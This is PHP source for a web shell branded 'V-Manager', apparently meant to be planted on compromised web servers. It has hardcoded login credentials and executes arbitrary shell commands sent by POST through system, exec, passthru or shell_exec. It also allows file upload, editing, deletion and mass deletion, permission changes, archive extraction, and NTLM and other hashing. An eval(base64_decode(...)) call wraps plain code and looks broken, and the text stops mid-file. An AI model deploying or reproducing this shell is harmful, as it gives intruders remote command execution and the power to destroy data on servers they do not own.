<?php
ob_start("ob_gzhandler");
@clearstatcache();
@error_reporting(0);
error_reporting(E_ERROR | E_PARSE);
ini_set('post_max_size', '1000M');
ini_set('upload_max_filesize', '1000M');
ini_set('memory_limit','1000M');
session_start(); 

// IMPORTANT , SET YOUR USERNAME AND PASSWORD

$_SESSION['username'] = "thevale"; // Default : thevale
$_SESSION['password'] = "irfanvalerian"; // Default : irfanvalerian

// Default Username : thevale
// Default Password : irfanvalerian 

eval(base64_decode("echo '<!doctype html>
<html lang="en">
  <head><meta charset="utf-8">
    <meta name="viewport" content="width=979">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link href="https://fonts.googleapis.com/css?family=New+Rocker&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Righteous&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Poppins&display=swap" rel="stylesheet">
'."<style>
#page-container {
  position: relative;
  min-height: 100vh;
}
.modal-body , .modal-header , .modal-footer , a , .mtype , .mdate , .text-info  {
    font-family: 'Poppins', sans-serif;
}
#content-wrap {
  padding-bottom: 4.0rem;    
}

#footer {
  position: absolute;
  bottom: 0;
  width: 100%;
  height: 3.6rem;
              
}
.denied {
   font-family: 'Poppins', sans-serif;
   font-weight: bold;
   letter-spacing: 3px;
   color: red;
   font-style: italic;
}
.aboutaing {
   font-family: 'Poppins', sans-serif;
}
.v {
   font-family: 'New Rocker', cursive;
   color:red;
   padding:4px;
   font-size: 35px;
   -webkit-text-stroke: 1px black;
}
footer {
      bottom:0;
      position: fixed;
      width:100%;
      background-color: #696969;
  }
.vo {
   font-family: 'New Rocker', cursive;
   color: white;
   font-size: 35px;
   -webkit-text-stroke: 1px black;
   padding:4px;
}
.manager {
    font-family: 'Righteous', cursive;
    color:gold;
    font-size: 35px;
    padding:3px;
    letter-spacing:4px;
    -webkit-text-stroke: 1px black;
}
.opsi {
width: 94px;
}
.namet {
  width: 201px;
}
.sizet {
  width: 100px;
}
.typet {
  width: 188px;
}
.gperm {
     color: green;
}
.ldate {
width: 200px;
}
.btn-primary {
  background-color: #0095ff;
  margin: 5px;
}
.hash {
    width: 84px;
}
.uplud {
    width: 90px;
}
.btn-primary:hover {
     box-shadow: 0 0 10px #00fffb,
                 0 0 25px #00e5ff,
                 0 0 40px #00b7ff,
                 0 0 90px #0080ff;
}
.btn-login {
     background-image: linear-gradient(to right,#0abeff,#ff00f7);
     color: white;
     width: 90px;
     border: 1px solid black;
     font-weight: bold;
}
.btn-login:hover {
      color:white;
      font-weight: bold;
      box-shadow: 0 0 10px #feedff,
                  0 0 25px #fa66ff,
                  0 0 40px #f830ff,
                  0 0 90px #f700ff;
}
.aboutme {
      width: 110px;
}
.btn-secondary:hover {
  box-shadow: 0 0 10px #d9dbde,
              0 0 25px #a9acb0,
              0 0 40px #7f8185,
              0 0 90px #6e7073;
}
.btn-danger:hover {
   box-shadow: 0 0 10px #ffcabd,
               0 0 25px #ff7857,
               0 0 40px #fa562d,
               0 0 90px #ff3b0a;
}
.btn-info:hover {
   box-shadow: 0 0 10px #0ca896,
               0 0 25px #19c2ae,
               0 0 40px #25e6cf,
               0 0 90px #00f7da;
}
.btn-warning:hover {
   box-shadow: 0 0 10px #f7da00,
               0 0 25px #edca00,
               0 0 40px #edb200,
               0 0 90px #ff9d00;
}
.path {
    font-size: 20px;
}

</style>".'
<title>V-Manager</title></head>
 <body class="bg-light">
 <div id="page-container">
 <div id="content-wrap">
<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
<script>
'."$(document).on('change', '.custom-file-input', function (event) {
    $(this).next('.custom-file-label').html(event.target.files[0].name);
})</script>
";

$form = '<br><br><br><div class="header"><center><font class="v">V</font><font class="vo">-</font><font class="manager">Manager</font></center></div><hr /><br><form method="POST" action="">
<center>
<i class="fa fa-user">'.str_repeat("&nbsp;",3).'</i><input class="rounded-pill" type="text" name="uname" pattern=".{1,}" required title="1 characters minimum" placeholder="                  Username"><br>
   <br>
<i class="fa fa-lock">'.str_repeat("&nbsp;",3).'</i><input type="password" class="rounded-pill" name="pass" pattern=".{1,}" required title="1 characters minimum" placeholder="                   Password"><br>
<br>
'.str_repeat("&nbsp;",5).'<button class="btn btn-login rounded-pill" type="submit">Login</button>
</form>
';

if(($_COOKIE['yourusername'] == $_SESSION['username']) && ($_COOKIE['yourpassword'] == $_SESSION['password'])){
        
echo "<br><div class='header'><center><font class='v'>V</font><font class='vo'>-</font><font class='manager'>Manager</font></center></div><hr />";
$path = $_GET['path'];
$file = $_GET['file'];
if(file_exists($path)){
      if(is_dir($path)){
         $path = $path;
}
}
else if($path == ""){
      $path = getcwd();
}

else {};
$pats = str_replace("\\","/",$path);
$pat = explode("/",$pats);
echo "<center><div class='path'><font class='text-info'><b>Current Path :</b></font><font class='text-primary'> ";
foreach($pat as $pos=>$loc){
     if($pos == 0 && $loc == ''){
        echo '<a href="?path=/">/</a>';
        continue;
}
     echo '<a href="?path=';
   if($loc == '') continue;
   for($a=0;$a<=$pos;$a++){
       echo $pat[$a];
      if($a != $pos){
       echo "/";
       } 
}
       echo '">'.htmlspecialchars($loc)."</a>";
       echo "/";

}
$path = htmlspecialchars($path);
echo "<font style='display:none'>".'"></a>'."</font></font><br><hr /></div></center>";
function emptyDir($dirname) {
    if (is_dir($dirname)) {
        $scn = scandir($dirname);
        foreach ($scn as $filess) {
            if ($filess !== '.') {
         if ($filess !== '..') {
                if (!is_dir($dirname . '/' . $filess)) {
                        unlink($dirname . '/' . $filess);
                 } else {
                     emptyDir($dirname . '/' . $filess);
                        rmdir($dirname . '/' . $filess);
               }
            }
        }
        }
    }
}

function deleteDir($dirname) {

    foreach(glob($dirname . '/' . '*') as $file) {
        if(is_dir($file)){


            deleteDir($file);
        } else {

          unlink($file);
        }
    }
    emptyDir($dirname);
    rmdir($dirname);
}

function zipMe($foldername, $ziplocation)
{
    $zip = new ZipArchive();
    $zip->open($ziplocation, ZipArchive::CREATE);
    
       $dirName = $foldername;
    if (substr($dirName, -1) != '/') {
       $dirName.= '/';
    }
    
    
        $dirStack = array($dirName);
    $cutFrom = strrpos(substr($dirName, 0, -1), '/')+1;
    
        while (!empty($dirStack)) {
    $Dir = array_pop($dirStack);
  $filesToAdd = array();
    
       $dir = dir($Dir);
        while (false !== ($node = $dir->read())) {
    if (($node == '..') || ($node == '.')) {
        continue;
    }
    if (is_dir($Dir . $node)) {
        array_push($dirStack, $Dir . $node . '/');
    }
    if (is_file($Dir . $node)) {
        $filesToAdd[] = $node;
        }
    }
    
      $localDir = substr($Dir, $cutFrom);
    $zip->addEmptyDir($localDir);
    
      foreach ($filesToAdd as $file) {
          $zip->addFile($Dir . $file, $localDir . $file);
        }
    }
    
    $zip->close();
}

function moveDir($oldDirLoc,$newDirLoc){
       mkdir($newDirLoc);
           $dirmove = $oldDirLoc ;
            $ew = $newDirLoc;
       
          if (is_dir($dirmove)) {
             if ($dh = opendir($dirmove)) {
       while (($fileM = readdir($dh)) !== false) {
          if ($fileM==".") continue;
             if ($fileM=="..")continue;
       
            rename($dirmove.'/'.$fileM,$dirNew.'/'.$fileM);               
          closedir($dh);
        rmdir($oldDirLoc);
       }
       }
}
}

function editFile($source,$edit){
      $fp = fopen($source,"w");
        fputs($fp,$edit);
    fclose($fp);
}


function downloadFile($thefile,$thename){
 header("Cache-Control: public");
 header("Content-Description: File Transfer");
 header("Content-Disposition: attachment; filename=$thename");
 header("Content-Length: ".filesize($thefile));
 header("Content-Type: application/force-download");
 header("Content-Transfer-Encoding: binary");
 readfile($thefile);
}

function untar($tarfile,$tarpath){
       
   $p = new PharData($tarfile);
     $p->decompress(); 
   
     $extTar = substr($tarfile,0,-3);
   $phar = new PharData($extTar);
   $phar->extractTo($tarpath);
     unlink($extTar);
}

function unZip($zipFile,$zipPath){
         $zip = new ZipArchive;
      $res = $zip->open($zipFile);
          if ($res === TRUE) {
         $zip->extractTo($zipPath);
      $zip->close();
         } else {}
}

function getUrl($locFile){
          $nowLink = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
          if(!stripos($nowLink,"?") === FALSE){
                $nowLink = substr($nowLink,0,stripos($nowLink,"?"));
          }
          else {
               $nowLink = $nowLink;
          }
          $nowWeb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http"). "://$_SERVER[HTTP_HOST]";
          $nowFile = basename($nowLink);          
          $nowPath = getcwd()."/".$nowFile;
          $fileLoc = realpath($locFile);
          $nowLoc = substr($nowLink,strlen($nowWeb));
          $rootPath = substr($nowPath,0,-(strlen($nowLoc)));
          $filePath = substr($fileLoc,strlen($rootPath));
          $fileUrl = $nowWeb.$filePath;
       return $fileUrl;
}

function getOgg($videoname){
        $video = getUrl($videoname);
        $ogg = substr($video,0,-3);
        $videoOgg = $ogg.'ogg';
     return $videoOgg;
}

function massDelF($massDelF){
      foreach($massDelF as $delF){
      unlink($delF);
      }
}

function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function lib_installed() {
	$lib[] = "<br><b>MYSQL".str_repeat('&nbsp;',33)." :".str_repeat('&nbsp;',5)." </b>".(function_exists('mysql_connect') ? "ON" : "OFF");
	$lib[] = "<b>CURL".str_repeat('&nbsp;',36)." :".str_repeat('&nbsp;',5)." </b>".(function_exists('curl_version') ? "ON" : "OFF");
	$lib[] = "<b>WGET".str_repeat('&nbsp;',35)." :".str_repeat('&nbsp;',5)." </b>".(exe('wget --help') ? "ON" : "OFF");
	$lib[] = "<b>PERL".str_repeat('&nbsp;',38)." :".str_repeat('&nbsp;',5)." </b>".(exe('perl --help') ? "ON" : "OFF");
	$lib[] = "<b>PYTHON".str_repeat('&nbsp;',31)." :".str_repeat('&nbsp;',5)." </b>".(exe('python --help') ? "ON" : "OFF");
	$lib[] = "<b>RUBY".str_repeat('&nbsp;',37)." :".str_repeat('&nbsp;',5)." </b>".(exe('ruby --help') ? "ON" : "OFF");
	$lib[] = "<b>GIT".str_repeat('&nbsp;',40)." :".str_repeat('&nbsp;',5)." </b>".(exe('git --help') ? "ON" : "OFF");
	
	return implode("<br>", $lib);
}

function massDelD($massDelD){
       foreach($massDelD as $delD){
            deleteDir($delD);       
       }

}

function delPic($arrData,$Mpath){
     foreach($arrData as $picF){
	     $pic = $Mpath."/".$picF;
     if(mime_content_type($pic) == "image/jpeg") unlink($pic);
	     else if(mime_content_type($pic) == "image/png") unlink($pic) && $Resp = TRUE;
	     else {
	     $Resp = FALSE;
	     }
	     }
	     return $Resp;
}

function delMusic($arrData,$Mpath){
        foreach($arrData as $musF){
            $music = $Mpath."/".$musF;
        if(mime_content_type($music) == "audio/mpeg") unlink($music) && $Resp = TRUE;
        else {
        $Resp = FALSE;
        }
        }
        return $Resp;
}

function delVideo($arrData,$Mpath){
        foreach($arrData as $vidF){
            $video = $Mpath."/".$vidF;
        if(mime_content_type($video) == "video/mp4") unlink($video) && $Resp = TRUE;
        else {
        $Resp = FALSE;
        }
        }
        return $Resp;
}

function delZip($arrData,$Mpath){
        foreach($arrData as $zipF){
            $ZiP = $Mpath."/".$zipF;
        if(mime_content_type($ZiP) == "application/zip") unlink($ZiP) && $Resp = TRUE;
        else {
            $Resp = FALSE;
        }
        }
    return $Resp;
}

function delHtml($arrData,$Mpath){
        foreach($arrData as $htmlF){
            $html = $Mpath."/".$htmlF;
        if(mime_content_type($html) == "text/html") unlink($html) && $Resp = TRUE;
        else if(preg_match("#\.html\z#i",$html)) unlink($html) && $Resp = TRUE;
        else if(preg_match("#\.htm\z#i",$html)) unlink($html) && $Resp = TRUE;
            else {
                  $Resp = FALSE;
            }
        }
    return $Resp;
}

function delTxt($arrData,$Mpath){
        foreach($arrData as $txtF){
            $txt = $Mpath."/".$txtF;
                if(preg_match("#\.txt\z#i",$txt)){
                    unlink($txt);  
                    $Resp = TRUE;
             }
          else {
              $Resp = FALSE;
          
          }
        
        }
    return $Resp;
}

function dellAllDir($arrData,$Mpath){
    foreach($arrData as $DirDel){
    if($DirDel == ".") continue;
    if($DirDel == "..") continue;
    $DePath = $Mpath."/".$DirDel;
    if(!is_dir($DePath)) continue;
   deleteDir($DePath);
    }

}

function dellAllFile($arrData,$Mpath){
       foreach($arrData as $FileDel){
            $FiPath = $Mpath."/".$FileDel;
            if(is_dir($FiPath)) continue;
         unlink($FiPath);
       
       }
}

function makeFile($fileTitle,$fileContent,$filePath){
          $fileLoc = $filePath."/".$fileTitle;
          $of = fopen($fileLoc,"w");
          fputs($of,$fileContent);
          fclose($of);
}

function hex_to_str($string) {
      return hex2bin("$string");
}

function chrs($codes) {
    $ret = "";
    foreach($codes as $c) $ret .= chr($c);
    return $ret;
}

function binaryToString($binary)
{
    $binaries = explode(' ', $binary);
 
    $string = null;
    foreach ($binaries as $binary) {
        $string .= pack('H*', dechex(bindec($binary)));
    }
 
    return $string;    
}

function stringToBinary($string)
{
    $characters = str_split($string);
 
    $binary = [];
    foreach ($characters as $character) {
        $data = unpack('H*', $character);
        $binary[] = base_convert($data[1], 16, 2);
    }
 
    return implode(' ', $binary);    
}

function NTLMHash($Input) {
  $Input=iconv('UTF-8','UTF-16LE',$Input);

  $MD4Hash=hash('md4',$Input);


  $NTLMHash=strtoupper($MD4Hash);

  return($NTLMHash);
}

if(isset($_POST['renameDir'])){
     $newdirname = $_POST['renameDir'];
     $newpath = $_POST['dirPath']."/".$newdirname;
     $oldpath = $_POST['oldDir'];
   if(rename($oldpath,$newpath)){
         $resp = '<div class="alert alert-success" role="alert">Rename Success</div>';
   }
   else {
        $resp = '<div class="alert alert-danger" role="alert">Rename Failed</div>';
   }
}
else if(isset($_POST['newChmod'])){
       $nperm = $_POST['newChmod'];
       $cdir = $_POST['chmodDir'];
     if(chmod($cdir,$nperm)){
        $resp = '<div class="alert alert-success" role="alert">Chmod Success</div>';
        }
    else {
        $resp = '<div class="alert alert-danger" role="alert">Chmod Failed</div>';
        }
    }
    
else if(isset($_POST['deletedir'])){
          $deldir = $_POST['deldir'];
          if(deleteDir($deldir)){
               $resp = '<div class="alert alert-danger" role="alert">Delete Failed</div>';
               }
         else {
               $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
          }
          
    }
       
else if(isset($_POST['comAs'])){       
       $zipName = $_POST['comAs'];
       $dirLoc = $_POST['comDir'];
       $zipPath = $_POST['comPath'];
       $zipLoc = $zipPath."/".$zipName;
     if(zipMe($dirLoc,$zipLoc)){
         $resp = '<div class="alert alert-danger" role="alert">Compress Failed</div>';
      }
    else {       
       $resp = '<div class="alert alert-success" role="alert">Compress Success</div>';
    }
  }
  
else if(isset($_POST['moveTo'])){
       $before = $_POST['moveDir'];
       $after = realpath($_POST['moveTo']);
    $dName = $after."/".$_POST['moveName'];
        if (moveDir($before,$dName)){
             $resp = '<div class="alert alert-success" role="alert">Move Success</div>';
        }
          else {
              $resp = '<div class="alert alert-danger" role="alert">Move Failed</div>';
          }
    }

else if(isset($_POST['newFile'])){
        $newdirname = $_POST['newFile'];
      $newpath = $_POST['filePath']."/".$newdirname;
     $oldpath = $_POST['oldFile'];
   if(rename($oldpath,$newpath)){
         $resp = '<div class="alert alert-success" role="alert">Rename Success</div>';
   }
   else {
        $resp = '<div class="alert alert-danger" role="alert">Rename Failed</div>';
   }
}

else if(isset($_POST['newChmodFile'])){
       $nperm = $_POST['newChmodFile'];
       $cdir = $_POST['chmodFile'];
     if(chmod($cdir,$nperm)){
        $resp = '<div class="alert alert-success" role="alert">Chmod Success</div>';
        }
    else {
        $resp = '<div class="alert alert-danger" role="alert">Chmod Failed</div>';
        }
    }

else if(isset($_POST['deletefile'])){
          $deldir = $_POST['delfile'];
          if(unlink($deldir)){
               $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
               }
         else {
               $resp = '<div class="alert alert-danger" role="alert">Delete Failed</div>';
          }
          
    }

else if(isset($_POST['newFileName'])){         
                  $filepath = $_POST['oldFilePath'];
                  $fileloc = $_POST['oldFileName'];
                  $filename = substr($fileloc,strlen($filepath."/"));
                              
                  $newname = $_POST['newFileName'];
                          
                    if(empty($_POST['copyToPath'])){
                          $toPath = $filepath."/".$newname;
                          $fromPath = $fileloc;
                       if(copy($fromPath,$toPath)) $resp = '<div class="alert alert-success" role="alert">Copy Success</div>';
                       else { 
                            $resp = '<div class="alert alert-danger" role="alert">Copy Failed</div>';
                        }
                    }
                 else {
                         if(is_dir($_POST['copyToPath'])){
                               $toPath = realpath($_POST['copyToPath'])."/".$newname;
                               $fromPath = $fileloc;
                            if(copy($fromPath,$toPath)) $resp = '<div class="alert alert-success" role="alert">Copy Success</div>';
                                else { 
                                    $resp = '<div class="alert alert-danger" role="alert">Copy Failed</div>';
                            }
                               }
                           else { 
                        $resp = '<div class="alert alert-danger" role="alert">Copy Failed</div>';
                      }
                 }
           }


else if(isset($_POST['moveDirTo'])){
            $fileFrom = $_POST['moveDirFrom'];
            $fileTo = $_POST['moveDirTo'];
            $filePath = $_POST['moveFilePath'];
            $fileName = $_POST['moveFileName'];
            $fileEnd = $fileTo."/".$fileName;
            
          if(is_dir($fileTo)){
              if(copy($fileFrom,$fileEnd)) {
               unlink($fileFrom);   
               $resp = '<div class="alert alert-success" role="alert">Move Success</div>';
                          }
               else {
                   $resp = '<div class="alert alert-danger" role="alert">Move Failed</div>';
               }
          }
       else {
           $resp = '<div class="alert alert-danger" role="alert">Move Failed</div>';
       }
}

else if(isset($_POST['FileLoc'])){
       $fileLoc = $_POST['FileLoc'];
       $fileName = $_POST['FileName'];
       $vName = "[Vmanager]".$fileName;
       if(downloadFile($fileLoc,$vName)){
              $resp = '<div class="alert alert-success" role="alert">Download Success</div>';
           }
      else {
           $resp = '<div class="alert alert-danger" role="alert">Download Failed</div>';
      }
     }
else if(isset($_POST['editTo'])){
      $editAs = $_POST['editTo'];
      $filesrc = $_POST['editLoc'];
         if(editFile($filesrc,$editAs)){
            $resp = '<div class="alert alert-danger" role="alert">Edit Failed</div>';
            }
      else {
          $resp = '<div class="alert alert-success" role="alert">Edit Success</div>';
            }
      }

else if(isset($_POST['tarTo'])){
       $tarTo = $_POST['tarTo'];
       $tarPath = $_POST['tarPath'];
       $tarFrom = $_POST['tarLoc'];
         if(empty($tarTo)){
              $tarTo = $tarPath;
         }
      else {
             $tarTo = realpath($tarTo);
         }
    if(untar($tarFrom,$tarTo)){
    $resp = '<div class="alert alert-danger" role="alert">Extract Failed</div>';
        }
 else {
        $resp = '<div class="alert alert-success" role="alert">Extract Success</div>';
    }
}

else if(isset($_POST['zipTo'])){
        $zipTo = $_POST['zipTo'];
        $zipPath = $_POST['zipPath'];
        $zipFrom = $_POST['zipLoc'];
      if(empty($zipTo)){
           $zipTo = $zipPath;
      }
   else {
         $zipTo = $zipTo;
   }
      if(unZip($zipFrom,$zipTo)){
           $resp = '<div class="alert alert-danger" role="alert">Extract Failed</div>';           
      }
    else {
        $resp = '<div class="alert alert-success" role="alert">Extract Success</div>';
    }
}
    else if(isset($_FILES['ups'])){
          $before = $_FILES['ups']['tmp_name'];
          $after = $_POST['uPath']."/".$_FILES['ups']['name'];
          if(move_uploaded_file($before,$after)){
        $resp = '<div class="alert alert-success" role="alert">Upload Success</div>';
           }
    else {
        $resp = '<div class="alert alert-danger" role="alert">Upload Failed</div>';
        }
}

else if(isset($_POST['deletedF'])){
         $arrF = $_POST['deletedF'];
      if(massDelF($arrF)){
         $resp = '<div class="alert alert-danger" role="alert">Delete Failed</div>';
            }
        else {
            $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
            }
}

else if(isset($_POST['deleteD'])){
       $arrD = $_POST['deleteD'];
    if(massDelD($arrD)){
       $resp = '<div class="alert alert-danger" role="alert">Delete Failed</div>';
            }
       else {
       $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
       }
}

else if(isset($_POST['massDel'])){
      $massDel = $_POST['massDel'];
    if($massDel == "delpic"){
        $scanD = scandir($path);
        if(delPic($scanD,$path)){
            $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
        }
        else {
          $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
            }
   }
   else if($massDel == "delmusic"){
   $scanD = scandir($path);
 	  if(delMusic($scanD,$path)){
   $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
   }
   else {
		   $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
		    }
   }
   else if($massDel == "delvideo"){
   $scanD = scandir($path);
	   if(delVideo($scanD,$path)){
   $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
   }
      else {
         $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
            }
  }
  else if($massDel == "delzip"){
 	 $scanD = scandir($path);
  if(delZip($scanD,$path)){
	 $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
  }
  
  else {
	$resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
		 }
  } 
  else if($massDel == "deltxthtml"){
  	$scanD = scandir($path);
  if(delHtml($scanD,$path)){
    $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
  }
  
  else {
  $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
    }
  }
  else if($massDel == "deltxtplain"){
  $scanD = scandir($path);
  if(delTxt($scanD,$path)){
	  $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
  }
  
  else {
	 $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
	 	  }
  }
  else if($massDel == "delalledir"){
  	$dellDirs = scandir($path);
  foreach($dellDirs as $eDir){
	  $ePath = $path."/".$eDir;
  if(!is_dir($ePath)) continue;
  if(is_dir($ePath)){
 	 if(rmdir($ePath)){
 		 $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
  }
  else {
		  $resp = '<div class="alert alert-danger" role="alert">Delete Failed</div>';
		  }
  
  }
  
  }
   
  
}

else if($massDel == "dellalldir"){
 $DellDir = scandir($path);
 if(dellAllDir($DellDir,$path)){
     $resp = '<div class="alert alert-danger" role="alert">Delete Failed</div>';
 }
 else {
    $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
 }
  }
else if($massDel == "delallfile"){
      $DellFile = scandir($path);
      if(dellAllFile($DellFile,$path)){
$resp = '<div class="alert alert-danger" role="alert">Delete Failed</div>';
 }
 else {
    $resp = '<div class="alert alert-success" role="alert">Delete Success</div>';
 }
      
}
  
  }
  
else if(isset($_POST['makeName'])){
        $fTitle = $_POST['makeName'];
        $fContent = $_POST['fcontent'];
     if(makeFile($fTitle,$fContent,$path)){
     $resp = '<div class="alert alert-danger" role="alert">File Not Created</div>';
     }
    	 else {
     $resp = '<div class="alert alert-success" role="alert">File Created</div>';
	     }
 }

else if(isset($_POST['makeDir'])){
      $theDirName = $_POST['makeDir'];
      if(mkdir($path."/".$theDirName)){
           $resp = '<div class="alert alert-success" role="alert">Directory Created</div>';           
      }
      else {
          $resp = '<div class="alert alert-danger" role="alert">Directory Not Created</div>';
          
      }
}

else if(isset($_POST['cmd'])){
		     echo '<script>
     $(document).ready(function(){
 		    $("#showFile").modal("show");
     });
     </script>
 	    <div id="showFile" class="modal" tabindex="-1" role="dialog">
				     <div class="modal-dialog modal-dialog-scrollable" role="document">
     <div class="modal-content">
     <div class="modal-header">
     <h5 class="modal-title">'."Response : ".$file.'</h5>
 	    </div>
     <div class="modal-body">
     <section id="exec" class="bg-light">
	     <p>'.exe($_POST['cmd']).'</p>
	       </section>
     </div>
     <div class="modal-footer">   
     <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>     
 	    </div>
     </div>
  	   </div>
     </div>';   
}

else if(isset($_POST['decode'])){
         $dfrom = $_POST['decode'];
         $dstring = $_POST['dreq'];
         $drespon = "";
       if($dfrom == "base64") $drespon = base64_decode($dstring);
       else if($dfrom == "hex") $drespon = hex_to_str($dstring);
       else if($dfrom == "url") $drespon = urldecode($dstring);
       else if($dfrom == "binary") $drespon = binaryToString($dstring);
       else if($dfrom == "charcode"){
             if(!stripos($dstring,",") === FALSE){
                   $dstring = explode(",",$dstring);
                   $drespon = chrs($dstring);
             }
  
             else {
                  $dstring = str_replace(" ",",",$dstring);
                  $dstring = explode(",",$dstring);
                  $drespon = chrs($dstring);
             }
       }
       
     echo '<script>
     $(document).ready(function(){
     $("#showDecode").modal("show");
     });
     </script>
     <div id="showDecode" class="modal" tabindex="-1" role="dialog">
     <div class="modal-dialog modal-dialog-scrollable" role="document">
     <div class="modal-content">
     <div class="modal-header">
     <h5 class="modal-title">'."Results : ".$file.'</h5>
     </div>
     <div class="modal-body">
     <section id="lol" class="bg-light">
     <p>'.$drespon.'</p>
     </section>
     </div>
     <div class="modal-footer">   
     <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>     
     </div>
     </div>
     </div>
     </div>';
}

else if(isset($_POST['encode'])){
         $dfrom = $_POST['encode'];
         $dstring = $_POST['ereq'];
         $drespon = "";
       if($dfrom == "base64") $drespon = base64_encode($dstring);
       else if($dfrom == "hex") $drespon = implode(unpack("H*", $dstring));
       else if($dfrom == "url") $drespon = urlencode($dstring);
       else if($dfrom == "binary") $drespon = stringToBinary($dstring);
       else if($dfrom == "charcode"){
        $drespon = unpack("C*", $dstring);
        $drespon = implode(",",$drespon);
        }
       else if($dfrom == "charcode"){
             if(!stripos($dstring,",") === FALSE){
                   $dstring = explode(",",$dstring);
                   $drespon = chrs($dstring);
             }
  
             else {
                  $dstring = str_replace(" ",",",$dstring);
                  $dstring = explode(",",$dstring);
                  $drespon = chrs($dstring);
             }
       }
       
     echo '<script>
     $(document).ready(function(){
	     $("#showEncode").modal("show");
     });
     </script>
	     <div id="showEncode" class="modal" tabindex="-1" role="dialog">
     <div class="modal-dialog modal-dialog-scrollable" role="document">
 			    <div class="modal-content">
     <div class="modal-header">
     <h5 class="modal-title">'."Results : ".$file.'</h5>
     </div>
		     <div class="modal-body">
     <section id="lol" class="bg-light">
     <p>'.$drespon.'</p>
		     </section>
     </div>
		     <div class="modal-footer">   
     <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>     
		     </div>
     </div>
 	    </div>
     </div>';
}

else if(isset($_POST['hashtype'])){
         $hplain = $_POST['plainhash'];
         $htype = $_POST['hashtype'];
      if($htype == "md5") $hrespon = md5($hplain);
      else if($htype == "sha256") $hrespon = hash('sha256',$hplain);
      else if($htype == "sha512") $hrespon = hash('sha512',$hplain);
      else if($htype == "sha1") $hrespon = sha1($hplain);
      else if($htype == "ripemd160") $hrespon = hash('ripemd160',$hplain);
      else if($htype == "ntlm") $hrespon = NTLMHash($hplain);
      else if($htype == "md4") $hrespon = hash('md4',$hplain);
      else if($htype == "bcrypt") $hrespon = password_hash($hplain,PASSWORD_DEFAULT);
 
 echo '<script>
    $(document).ready(function(){
    $("#showHash").modal("show");
    });
    </script>
    <div id="showHash" class="modal" tabindex="-1" role="dialog">
    <div class="modal-dialog modal-dialog-scrollable" role="document">
    <div class="modal-content">
    <div class="modal-header">
    <h5 class="modal-title">'."Results : ".$file.'</h5>
    </div>
    <div class="modal-body">
    <section id="lol" class="bg-light">
    <p>'.$hrespon.'</p>
    </section>
    </div>
    <div class="modal-footer">   
    <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>     
    </div>
    </div>
    </div>
    </div>';
}

else {
    $resp = "";
}
 echo "<br>";
echo "<!----><font style='display:none'>".'"><br></a><br></font>'.str_repeat("&nbsp;",7).'<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#deleteMassFile">
   Delete Files
</button>
<div class="modal fade" id="deleteMassFile" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Delete Selected Files</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	  <p><b>Select Files : </b></p>
 	 <form method="POST" action="">
 	   <select multiple class="form-control" name="deletedF[]">';
 	   $list = scandir($path);
